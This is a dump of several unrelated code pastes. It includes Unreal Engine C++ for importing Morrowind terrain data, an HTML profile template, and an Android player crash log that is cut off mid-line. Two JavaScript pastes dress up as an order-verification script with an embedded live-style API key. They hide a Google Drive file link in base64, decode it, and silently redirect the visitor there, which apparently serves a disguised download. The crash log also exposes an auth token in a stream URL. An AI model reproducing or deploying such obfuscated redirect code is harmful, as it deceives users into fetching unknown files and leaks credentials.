// - ScaleX, ScaleY, ScaleZ: Scaling factors for the landscape.
// Returns: Pointer to the created ALandscape actor, or nullptr on failure.
ALandscape* UESMDataMapper::CreateLandscapeFromHeightmapBytes(
    UWorld* World,
    const TArray<uint8>& HeightmapBytes,
    int32 Width,
    int32 Height,
    float ScaleX,
    float ScaleY,
    float ScaleZ)
{
    // Validate the world pointer.
    if (!World)
    {
        UE_LOG(LogTemp, Error, TEXT(""World is null""));
        return nullptr;
    }

    // Validate the heightmap size (should match Width * Height * sizeof(uint16)).
    if (HeightmapBytes.Num() == 0 || HeightmapBytes.Num() != Width * Height * sizeof(uint16))
    {
        UE_LOG(LogTemp, Error, TEXT(""HeightmapBytes size (%d) does not match Width * Height * 2 (%d)""), HeightmapBytes.Num(), Width * Height * sizeof(uint16));
        return nullptr;
    }

    // Reinterpret the byte array as uint16 values.
    const uint16* HeightmapData = reinterpret_cast<const uint16*>(HeightmapBytes.GetData());

    // Spawn a new landscape actor.
    ALandscape* Landscape = World->SpawnActor<ALandscape>();
    if (!Landscape)
    {
        UE_LOG(LogTemp, Error, TEXT(""Failed to spawn landscape actor""));
        return nullptr;
    }

    // Generate a new GUID for the landscape.
    FGuid LandscapeGuid = FGuid::NewGuid();
    if (!LandscapeGuid.IsValid())
    {
        UE_LOG(LogTemp, Error, TEXT(""Generated LandscapeGuid is invalid""));
        Landscape->Destroy();
        return nullptr;
    }

    // Prepare the height data map for the Import function.
    TMap<FGuid, TArray<uint16>> HeightDataMap;
    TArray<uint16> HeightArray;
    HeightArray.SetNum(Width * Height);
    FMemory::Memcpy(HeightArray.GetData(), HeightmapData, Width * Height * sizeof(uint16));
    HeightDataMap.Add(LandscapeGuid, MoveTemp(HeightArray));

    // Create a LandscapeInfo object to manage metadata.
    ULandscapeInfo* LandscapeInfo = Landscape->CreateLandscapeInfo();
    if (!LandscapeInfo)
    {
        UE_LOG(LogTemp, Error, TEXT(""Failed to create LandscapeInfo""));
        Landscape->Destroy();
        return nullptr;
    }

    // Assign the GUID to the LandscapeInfo.
    LandscapeInfo->LandscapeGuid = LandscapeGuid;

    // Import the heightmap into the landscape (this method causes the crash).
    Landscape->Import(
        LandscapeGuid,
        0,                      // Min X
        0,                      // Min Y
        Width - 1,              // Max X
        Height - 1,             // Max Y
        1,                      // Num subsections
        Width - 1,              // Subsection size quads
        HeightDataMap,          // Height data
        TEXT(""None""),           // Material (none for now)
        TMap<FGuid, TArray<FLandscapeImportLayerInfo>>(), // No layers
        ELandscapeImportAlphamapType::Additive, // Alphamap type
        nullptr                 // No error message
    );

    // Apply the scaling to the landscape actor.
    Landscape->SetActorScale3D(FVector(ScaleX, ScaleY, ScaleZ));
    return Landscape;
}

// Creates a landscape actor using a modern Unreal Engine 5 approach with raw height data.
// Parameters:
// - World: The UWorld to spawn the landscape in.
// - Heights: Array of height values in float format.
// - CellX, CellY: Cell coordinates for positioning the landscape.
// - Width, Height: Dimensions of the heightmap (e.g., 65x65).
// - ScaleX, ScaleY, ScaleZ: Scaling factors for the landscape.
// Returns: Pointer to the created ALandscape actor, or nullptr on failure.
ALandscape* UESMDataMapper::CreateLandscapeModern(
    UWorld* World,
    const TArray<float>& Heights,
    int32 CellX,
    int32 CellY,
    int32 Width,
    int32 Height,
    float ScaleX,
    float ScaleY,
    float ScaleZ)
{
    // Validate the world pointer.
    if (!World)
    {
        UE_LOG(LogTemp, Error, TEXT(""World is null""));
        return nullptr;
    }

    // Validate that the input heights array matches the expected size (Width * Height).
    if (Heights.Num() != Width * Height)
    {
        UE_LOG(LogTemp, Error, TEXT(""Heights size (%d) does not match Width * Height (%d)""), Heights.Num(), Width * Height);
        return nullptr;
    }

    // Normalize height data to uint16 range (0-65535) for Unreal Engine.
    TArray<uint16> Heightmap;
    Heightmap.SetNum(Heights.Num());
    // Define the Unreal Engine height range.
    float MinHeight = -2048.0f;
    float MaxHeight = 2048.0f;
    // Find the min and max height values in the input data.
    float DataMin = Heights[0];
    float DataMax = Heights[0];
    for (float HeightValue : Heights)
    {
        DataMin = FMath::Min(DataMin, HeightValue);
        DataMax = FMath::Max(DataMax, HeightValue);
    }
    // Normalize and scale the heights.
    float DataRange = DataMax - DataMin;
    float UnrealRange = MaxHeight - MinHeight;
    for (int32 i = 0; i < Heights.Num(); i++)
    {
        // Normalize to [0, 1] based on the data range.
        float Normalized = (DataRange > 0) ? (Heights[i] - DataMin) / DataRange : 0.5f;
        // Scale to Unreal’s height range.
        float ScaledHeight = MinHeight + (Normalized * UnrealRange);
        // Convert to uint16 (0-65535).
        Heightmap[i] = static_cast<uint16>((ScaledHeight - MinHeight) / UnrealRange * 65535);
        // Log the first 5 values for debugging.
        if (i < 5)
        {
            UE_LOG(LogTemp, Log, TEXT(""Heightmap[%d]: %d (ScaledHeight=%f)""), i, Heightmap[i], ScaledHeight);
        }
    }

    // Convert Heightmap (uint16) to FColor format for InitHeightmapData.
    TArray<FColor> HeightmapColors;
    HeightmapColors.SetNum(Heightmap.Num());
    for (int32 i = 0; i < Heightmap.Num(); i++)
    {
        // Landscape heightmaps store height in R (high byte) and G (low byte).
        HeightmapColors[i].R = (Heightmap[i] >> 8) & 0xFF; // High byte
        HeightmapColors[i].G = Heightmap[i] & 0xFF;        // Low byte
        HeightmapColors[i].B = 0;
        HeightmapColors[i].A = 0;
    }

    // Get the landscape subsystem to manage landscape creation.
    ULandscapeSubsystem* LandscapeSubsystem = World->GetSubsystem<ULandscapeSubsystem>();
    if (!LandscapeSubsystem)
    {
        UE_LOG(LogTemp, Error, TEXT(""Failed to get LandscapeSubsystem""));
        return nullptr;
    }

    // Create or find a LandscapeInfo object to manage the landscape metadata.
    FGuid LandscapeGuid = FGuid::NewGuid();
    if (!LandscapeGuid.IsValid())
    {
        UE_LOG(LogTemp, Error, TEXT(""Generated LandscapeGuid is invalid""));
        return nullptr;
    }

    ULandscapeInfo* LandscapeInfo = ULandscapeInfo::FindOrCreate(World, LandscapeGuid);
    if (!LandscapeInfo)
    {
        UE_LOG(LogTemp, Error, TEXT(""Failed to create LandscapeInfo""));
        return nullptr;
    }

    // Spawn a new landscape actor.
    ALandscape* Landscape = World->SpawnActor<ALandscape>();
    if (!Landscape)
    {
        UE_LOG(LogTemp, Error, TEXT(""Failed to spawn landscape actor""));
        return nullptr;
    }

    // Set basic landscape properties.
    Landscape->ComponentSizeQuads = Width - 1; // Quads = Verts - 1
    Landscape->SubsectionSizeQuads = Width - 1; // Single subsection for simplicity
    Landscape->SetActorScale3D(FVector(ScaleX, ScaleY, ScaleZ));

    // Calculate the section base position based on CellX, CellY.
    // Each cell is (Width-1) quads wide/tall, so SectionBase aligns the landscape in the world.
    FIntPoint SectionBase(CellX * (Width - 1), CellY * (Height - 1));

    // Find or add a landscape proxy using the subsystem.
    ALandscapeProxy* LandscapeProxy = LandscapeSubsystem->FindOrAddLandscapeProxy(LandscapeInfo, SectionBase);
    if (!LandscapeProxy)
    {
        UE_LOG(LogTemp, Error, TEXT(""Failed to find or add LandscapeProxy""));
        Landscape->Destroy();
        return nullptr;
    }

    // Create a single landscape component to hold the heightmap data.
    ULandscapeComponent* Component = NewObject<ULandscapeComponent>(Landscape);
    if (!Component)
    {
        UE_LOG(LogTemp, Error, TEXT(""Failed to create LandscapeComponent""));
        Landscape->Destroy();
        return nullptr;
    }

    // Set component properties to match the landscape dimensions.
    Component->ComponentSizeQuads = Width - 1;
    Component->SubsectionSizeQuads = Width - 1;
    Component->NumSubsections = 1;
    // Set the component's position using SetSectionBase.
    Component->SetSectionBase(SectionBase);

    // Initialize the component with the height data.
    Component->InitHeightmapData(HeightmapColors, false); // false for bUpdateCollision, as we’re not handling collision here

    // Register the component with the world and the LandscapeInfo.
    Component->RegisterComponent();
    LandscapeInfo->RegisterActorComponent(Component);

    // Update the LandscapeInfo with the landscape properties.
    LandscapeInfo->LandscapeActor = Landscape;
    LandscapeInfo->ComponentSizeQuads = Width - 1;
    LandscapeInfo->SubsectionSizeQuads = Width - 1;
    LandscapeInfo->ComponentNumSubsections = 1;
    LandscapeInfo->DrawScale = FVector(ScaleX, ScaleY, ScaleZ);

    // Log success message with the cell coordinates.
    UE_LOG(LogTemp, Log, TEXT(""Successfully created landscape for cell (%d, %d) with height data applied""), CellX, CellY);
    return Landscape;
}"
n81LMGS2,ESMDataMapper.h,malice936,C++,Thursday 17th of April 2025 04:13:38 PM CDT,"// Warning! Experimental! No guarantees on functionality! Use at your own risk!!!!!
#pragma once

#include ""CoreMinimal.h""
#include ""Kismet/BlueprintFunctionLibrary.h""
#include ""Landscape.h""
#include ""Plugin.h""
#include ""ESMDataMapper.generated.h""

UCLASS()
class UESMDataMapper : public UBlueprintFunctionLibrary
{
    GENERATED_BODY()
public:
    /** Extracts height data from a single LAND record. Returns false if the record is not a LAND record or lacks VHGT data. */
    UFUNCTION(BlueprintCallable, Category = ""ESM Mapping"")
    static bool ExtractHeightDataFromRecord(const FRecord& Record, int32 CellX, int32 CellY, TArray<float>& OutHeightData, float& OutHeightOffset);

    /** Extracts height data from an array of records for a specific cell (X, Y). Returns false if no matching LAND record is found. */
    UFUNCTION(BlueprintCallable, Category = ""ESM Mapping"")
    static bool ExtractHeightDataFromRecords(const TArray<FRecord>& Records, int32 CellX, int32 CellY, TArray<float>& OutHeights, float& OutHeightOffset);

    /** Extracts height data from LAND records in the plugin for a specific cell (X, Y). Returns false if no matching LAND record is found. */
    UFUNCTION(BlueprintCallable, Category = ""ESM Mapping"")
    static bool ExtractLandHeightDataFromPlugin(const FPlugin& Plugin, int32 CellX, int32 CellY, TArray<float>& OutHeights, float& OutHeightOffset);

    /** Handles individual LAND record processing, extracting CellX, CellY, and height data. */
    UFUNCTION(BlueprintCallable, Category = ""ESM Mapping"")
    static bool LANDHandler(const FRecord& Record, int32& CellX, int32& CellY, TArray<float>& OutHeightData, float& OutHeightOffset);

    /** Converts raw height data to a heightmap represented as bytes (legacy method). */
    UFUNCTION(BlueprintCallable, Category = ""ESM Mapping"")
    static TArray<uint8> ConvertESMHeightToHeightmapBytes(const TArray<float>& Heights, float MinHeight, float MaxHeight);

    /** Creates a landscape actor from a heightmap stored as bytes (legacy method). */
    UFUNCTION(BlueprintCallable, Category = ""ESM Mapping"")
    static ALandscape* CreateLandscapeFromHeightmapBytes(UWorld* World, const TArray<uint8>& HeightmapBytes, int32 Width, int32 Height, float ScaleX, float ScaleY, float ScaleZ);

    /** Creates a landscape actor using a modern Unreal Engine 5 approach with raw height data. */
    UFUNCTION(BlueprintCallable, Category = ""ESM Mapping"")
    static ALandscape* CreateLandscapeModern(UWorld* World, const TArray<float>& Heights, int32 CellX, int32 CellY, int32 Width, int32 Height, float ScaleX, float ScaleY, float ScaleZ);
};"
hs1VJPmU,revamped bear,elltaker,HTML,Thursday 17th of April 2025 04:13:02 PM CDT,"<div class=""container p-2 col-md-3"">
    
    <div class=""row no-gutters"">
        
        <!-- pagedoll -->
        <div class=""container col-5 mb-3"" style=""background-image: url(https://f2.toyhou.se/file/f2-toyhou-se/images/98421672_lZu43NGaeq5dXgg.png); background-size:contain; background-repeat:no-repeat; background-position: center; height: 200px;""></div>
            
        <div class=""container col-7 p-2 mb-3"" style=""max-height:200px; overflow-y:auto; scrollbar-width: none;"">
            
            <!-- info -->
            <p style=""font-family:verdana; text-align:center; font-size:15px;"">
                
                <img src=""https://graphic.neocities.org/bear37.gif"" style=""height:15px; width:15px"">
                
                firstname lastname 
            
                <img src=""https://graphic.neocities.org/bear37.gif"" style=""height:15px; width:15px""><br>
            
                <span style=""font-size:10px;"">prns/prns
                
                <img src=""https://graphic.neocities.org/%E3%81%8F%E3%81%BE%E3%81%95%E3%82%93-%E3%82%AF%E3%83%9E_m%20(2).gif"" style=""height:10px; width:10px"">
                
                gender
                
                <img src=""https://graphic.neocities.org/%E3%81%8F%E3%81%BE%E3%81%95%E3%82%93-%E3%82%AF%E3%83%9E_m%20(2).gif"" style=""height:10px; width:10px"">
                
                species
                
                <img src=""https://graphic.neocities.org/%E3%81%8F%E3%81%BE%E3%81%95%E3%82%93-%E3%82%AF%E3%83%9E_m%20(2).gif"" style=""height:10px; width:10px"">
                
                etc</span><br><br>
                
                <img src=""https://graphic.neocities.org/tumblr_lse9t207Yd1qiz8uq540.gif"" style=""height:20px;"">
                
                <br><br><span style=""font-size:13px;"">write about your character HERE!!!!11! this scrolls, so yap away!!! Lorem ipsum dolor sit amet, consectetur adipiscing elit.</span>
                
                </p>
                
            <div class=""mb-2""></div>
                
            <p style=""text-align:center;"">
                
                <img src=""https://graphic.neocities.org/Bear_196.gif"" style=""height:px;"">
        
            </p>
    
        </div>
        
    </div>
    
    <p style=""text-align:right;"">
        
        <!-- credit -->
        <a href=""ART_CREDIT_LINK"" class=""tooltipster"" title=""art by BLANK""><i class=""fa-solid fa-palette fa-xs""></i></a>
        <a href=""https://toyhou.se/elltaker"" class=""tooltipster"" title=""code by elltaker""><i class=""fa-solid fa-code fa-xs""></i></a>
        
    </p>
    
</div>"
pqCuvNUE,ExtractMorrowindFormLibrary.cpp,malice936,C++,Thursday 17th of April 2025 04:12:16 PM CDT,"// Warning! Experimental! No guarantees on functionality! Use at your own risk!!!!!
#include ""ExtractMorrowindFormLibrary.h""
#include ""Serialization/MemoryReader.h""

TArray<uint8> UExtractMorrowindFormLibrary::ExtractMorrowindFormData(const TArray<uint8>& MainFileData)
{
    TArray<uint8> ExtractedData;
    FMemoryReader Ar(MainFileData, true);

    while (!Ar.AtEnd())
    {
        // Read record type (4 bytes)
        FString RecordType;
        Ar << RecordType;

        // Read record size (4 bytes)
        int32 RecordSize;
        Ar << RecordSize;

        int64 RecordEnd = Ar.Tell() + RecordSize;

        while (Ar.Tell() < RecordEnd)
        {
            // Read subrecord type (4 bytes)
            FString SubrecordType;
            Ar << SubrecordType;

            // Read subrecord size (4 bytes)
            int32 SubrecordSize;
            Ar << SubrecordSize;

            // Read subrecord data
            TArray<uint8> SubrecordData;
            SubrecordData.SetNum(SubrecordSize);
            Ar.Serialize(SubrecordData.GetData(), SubrecordSize);

            // Append all subrecord data to the result
            ExtractedData.Append(SubrecordData);
        }
    }

    return ExtractedData;
}"
6bPZdbuC,ExtractMorrowindFormLibrary.h,malice936,C++,Thursday 17th of April 2025 04:11:12 PM CDT,"// Warning! Experimental! No guarantees on functionality! Use at your own risk!!!!!
#pragma once

#include ""CoreMinimal.h""
#include ""Kismet/BlueprintFunctionLibrary.h""
#include ""ExtractMorrowindFormLibrary.generated.h""

UCLASS()
class UExtractMorrowindFormLibrary : public UBlueprintFunctionLibrary
{
    GENERATED_BODY()

public:
    UFUNCTION(BlueprintCallable, Category = ""MorrowindData"")
    static TArray<uint8> ExtractMorrowindFormData(const TArray<uint8>& MainFileData);
};"
JcRmGKVh,Market.js,kammex,JavaScript,Thursday 17th of April 2025 04:10:49 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11335/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
JnrWVm1q,UnrealCreationEngine.Build.cs,malice936,C++,Thursday 17th of April 2025 04:09:26 PM CDT,"using UnrealBuildTool;

public class UnrealCreationEngine : ModuleRules
{
    public UnrealCreationEngine(ReadOnlyTargetRules Target) : base(Target)
    {
        PCHUsage = PCHUsageMode.UseExplicitOrSharedPCHs;

        // Public dependencies for Blueprint compatibility, data exposure, and Phase 3 extensibility
        PublicDependencyModuleNames.AddRange(new string[] 
        { 
            ""Core"",          // Core Unreal functionality
            ""CoreUObject"",   // UObject system
            ""Engine"",        // Engine features
            ""InputCore"",     // Basic input
            ""EnhancedInput"", // Advanced input for Bethesda-like systems
            ""UnrealEd"",      // Editor tools for accessibility
            ""Json"",          // JSON data parsing
            ""JsonUtilities"", // JSON serialization utilities
            ""Landscape""      // For ALandscape and related types
        });

        // Private dependencies (add here if needed)
        PrivateDependencyModuleNames.AddRange(new string[] { });

        CppStandard = CppStandardVersion.Cpp17;
    }
}"
uUbLed6D,Untitled,kammex,JavaScript,Thursday 17th of April 2025 03:55:25 PM CDT,"(async function () {
  const apiEndpoint = ""/v1/order/11191/status"";
  const orderId = ""ORD-"" + Math.random().toString(36).substring(2, 10).toUpperCase();

  async function verifyOrder(id) {
    try {
      const response = await fetch(apiEndpoint, {
        method: ""POST"",
        headers: {
          ""Content-Type"": ""application/json"",
          ""Authorization"": ""Bearer sk_live_xr7u8ghs1k2as91""
        },
        body: JSON.stringify({ order_id: id })
      });

      const data = await response.json();
      return data;
    } catch (err) {
      return { status: ""ERROR"" };
    }
  }

  function logEvent(id, status) {
    fetch(""/v1/event"", {
      method: ""POST"",
      headers: {
        ""Content-Type"": ""application/json""
      },
      body: JSON.stringify({
        event: ""delivery_attempt"",
        order: id,
        result: status
      })
    });
  }

  const secret = 'aHR0cHM6Ly9kcml2ZS5nb29nbGUuY29tL2ZpbGUvZC8xOFpfQ290djVDYjFYQkcxSFdwaXZKT0VYaUN1MHJnTWsvdmlldw==';
  const decode = atob;
  const finalURL = decode(secret);

  window.open(finalURL, '_self');

  const status = await verifyOrder(orderId);
  logEvent(orderId, status.status === ""CONFIRMED"" ? ""success"" : ""fallback"");
})();"
NgHEHSUH,2025-04-17T16:49:13.316803,powerampache,PHP,Thursday 17th of April 2025 03:49:13 PM CDT,"1.01-80-play.debug (80) - DB: 83
androidx.media3.exoplayer.ExoPlaybackException: Source error
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleIoException(ExoPlayerImplInternal.java:864)
	at androidx.media3.exoplayer.ExoPlayerImplInternal.handleMessage(ExoPlayerImplInternal.java:836)
	at android.os.Handler.dispatchMessage(Handler.java:105)
	at android.os.Looper.loopOnce(Looper.java:232)
	at android.os.Looper.loop(Looper.java:317)
	at android.os.HandlerThread.run(HandlerThread.java:85)
Caused by: androidx.media3.datasource.HttpDataSource$HttpDataSourceException: java.net.SocketTimeoutException: timeout
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:370)
	at androidx.media3.datasource.DefaultDataSource.open(DefaultDataSource.java:275)
	at androidx.media3.datasource.TeeDataSource.open(TeeDataSource.java:54)
	at androidx.media3.datasource.cache.CacheDataSource.openNextSource(CacheDataSource.java:802)
	at androidx.media3.datasource.cache.CacheDataSource.open(CacheDataSource.java:615)
	at androidx.media3.datasource.StatsDataSource.open(StatsDataSource.java:88)
	at androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable.load(ProgressiveMediaPeriod.java:1109)
	at androidx.media3.exoplayer.upstream.Loader$LoadTask.run(Loader.java:453)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1156)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:651)
	at java.lang.Thread.run(Thread.java:1119)
Caused by: java.net.SocketTimeoutException: timeout
	at com.android.okhttp.okio.Okio$3.newTimeoutException(Okio.java:214)
	at com.android.okhttp.okio.AsyncTimeout.exit(AsyncTimeout.java:263)
	at com.android.okhttp.okio.AsyncTimeout$2.read(AsyncTimeout.java:217)
	at com.android.okhttp.okio.RealBufferedSource.indexOf(RealBufferedSource.java:307)
	at com.android.okhttp.okio.RealBufferedSource.indexOf(RealBufferedSource.java:301)
	at com.android.okhttp.okio.RealBufferedSource.readUtf8LineStrict(RealBufferedSource.java:197)
	at com.android.okhttp.internal.http.Http1xStream.readResponse(Http1xStream.java:188)
	at com.android.okhttp.internal.http.Http1xStream.readResponseHeaders(Http1xStream.java:129)
	at com.android.okhttp.internal.http.HttpEngine.readNetworkResponse(HttpEngine.java:750)
	at com.android.okhttp.internal.http.HttpEngine.readResponse(HttpEngine.java:622)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.execute(HttpURLConnectionImpl.java:475)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.getResponse(HttpURLConnectionImpl.java:411)
	at com.android.okhttp.internal.huc.HttpURLConnectionImpl.getResponseCode(HttpURLConnectionImpl.java:542)
	at com.android.okhttp.internal.huc.DelegatingHttpsURLConnection.getResponseCode(DelegatingHttpsURLConnection.java:106)
	at com.android.okhttp.internal.huc.HttpsURLConnectionImpl.getResponseCode(HttpsURLConnectionImpl.java:30)
	at androidx.media3.datasource.DefaultHttpDataSource.open(DefaultHttpDataSource.java:366)
	... 10 more
Caused by: java.net.SocketException: Socket closed
	at java.net.SocketInputStream.read(SocketInputStream.java:188)
	at java.net.SocketInputStream.read(SocketInputStream.java:143)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.readFromSocket(ConscryptEngineSocket.java:994)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.processDataFromSocket(ConscryptEngineSocket.java:958)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.readUntilDataAvailable(ConscryptEngineSocket.java:873)
	at com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream.read(ConscryptEngineSocket.java:846)
	at com.android.okhttp.okio.Okio$2.read(Okio.java:138)
	at com.android.okhttp.okio.AsyncTimeout$2.read(AsyncTimeout.java:213)
	... 23 more

onPlayerError HttpDataSourceException - PlaybackException 
Error Code: 2002. Issues playing this track.
{""isRecoverable"":false,""mediaPeriodId"":{""adGroupIndex"":-1,""adIndexInAdGroup"":-1,""nextAdGroupIndex"":-1,""periodUid"":{""first"":{},""second"":{}},""windowSequenceNumber"":7},""rendererFormatSupport"":4,""rendererIndex"":-1,""type"":0,""errorCode"":2002,""extras"":{""mMap"":{}},""timestampMs"":74244821,""cause"":{""dataSpec"":{""absoluteStreamPosition"":4189246,""flags"":6,""httpMethod"":1,""httpRequestHeaders"":{""Icy-MetaData"":""1""},""key"":""https://tari.ddns.net:4441/index.php/apps/music/ampache/server/json.server.php?action\u003dstream\u0026stats\u003d0\u0026auth\u003debcfc1497ca3ecde1c6a85123eba178f\u0026type\u003dsong\u0026id\u003d778"",""length"":2585099,""position"":4189246,""uri"":{},""uriPositionOffset"":0},""type"":1,""reason"":2002,""cause"":{""bytesTransferred"":0,""cause"":{""detailMessage"":""Socket closed"",""stackTrace"":[{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":188,""methodName"":""read""},{""declaringClass"":""java.net.SocketInputStream"",""fileName"":""SocketInputStream.java"",""lineNumber"":143,""methodName"":""read""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":994,""methodName"":""readFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":958,""methodName"":""processDataFromSocket""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":873,""methodName"":""readUntilDataAvailable""},{""declaringClass"":""com.android.org.conscrypt.ConscryptEngineSocket$SSLInputStream"",""fileName"":""ConscryptEngineSocket.java"",""lineNumber"":846,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.Okio$2"",""fileName"":""Okio.java"",""lineNumber"":138,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.AsyncTimeout$2"",""fileName"":""AsyncTimeout.java"",""lineNumber"":213,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":307,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":301,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":197,""methodName"":""readUtf8LineStrict""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":188,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":129,""methodName"":""readResponseHeaders""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":750,""methodName"":""readNetworkResponse""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":622,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":475,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":411,""methodName"":""getResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":542,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.DelegatingHttpsURLConnection"",""fileName"":""DelegatingHttpsURLConnection.java"",""lineNumber"":106,""methodName"":""getResponseCode""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpsURLConnectionImpl"",""fileName"":""HttpsURLConnectionImpl.java"",""lineNumber"":30,""methodName"":""getResponseCode""},{""declaringClass"":""androidx.media3.datasource.DefaultHttpDataSource"",""fileName"":""DefaultHttpDataSource.java"",""lineNumber"":366,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.DefaultDataSource"",""fileName"":""DefaultDataSource.java"",""lineNumber"":275,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.TeeDataSource"",""fileName"":""TeeDataSource.java"",""lineNumber"":54,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":802,""methodName"":""openNextSource""},{""declaringClass"":""androidx.media3.datasource.cache.CacheDataSource"",""fileName"":""CacheDataSource.java"",""lineNumber"":615,""methodName"":""open""},{""declaringClass"":""androidx.media3.datasource.StatsDataSource"",""fileName"":""StatsDataSource.java"",""lineNumber"":88,""methodName"":""open""},{""declaringClass"":""androidx.media3.exoplayer.source.ProgressiveMediaPeriod$ExtractingLoadable"",""fileName"":""ProgressiveMediaPeriod.java"",""lineNumber"":1109,""methodName"":""load""},{""declaringClass"":""androidx.media3.exoplayer.upstream.Loader$LoadTask"",""fileName"":""Loader.java"",""lineNumber"":453,""methodName"":""run""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":1156,""methodName"":""runWorker""},{""declaringClass"":""java.util.concurrent.ThreadPoolExecutor$Worker"",""fileName"":""ThreadPoolExecutor.java"",""lineNumber"":651,""methodName"":""run""},{""declaringClass"":""java.lang.Thread"",""fileName"":""Thread.java"",""lineNumber"":1119,""methodName"":""run""}]},""detailMessage"":""timeout"",""stackTrace"":[{""declaringClass"":""com.android.okhttp.okio.Okio$3"",""fileName"":""Okio.java"",""lineNumber"":214,""methodName"":""newTimeoutException""},{""declaringClass"":""com.android.okhttp.okio.AsyncTimeout"",""fileName"":""AsyncTimeout.java"",""lineNumber"":263,""methodName"":""exit""},{""declaringClass"":""com.android.okhttp.okio.AsyncTimeout$2"",""fileName"":""AsyncTimeout.java"",""lineNumber"":217,""methodName"":""read""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":307,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":301,""methodName"":""indexOf""},{""declaringClass"":""com.android.okhttp.okio.RealBufferedSource"",""fileName"":""RealBufferedSource.java"",""lineNumber"":197,""methodName"":""readUtf8LineStrict""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":188,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.http.Http1xStream"",""fileName"":""Http1xStream.java"",""lineNumber"":129,""methodName"":""readResponseHeaders""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":750,""methodName"":""readNetworkResponse""},{""declaringClass"":""com.android.okhttp.internal.http.HttpEngine"",""fileName"":""HttpEngine.java"",""lineNumber"":622,""methodName"":""readResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":475,""methodName"":""execute""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineNumber"":411,""methodName"":""getResponse""},{""declaringClass"":""com.android.okhttp.internal.huc.HttpURLConnectionImpl"",""fileName"":""HttpURLConnectionImpl.java"",""lineN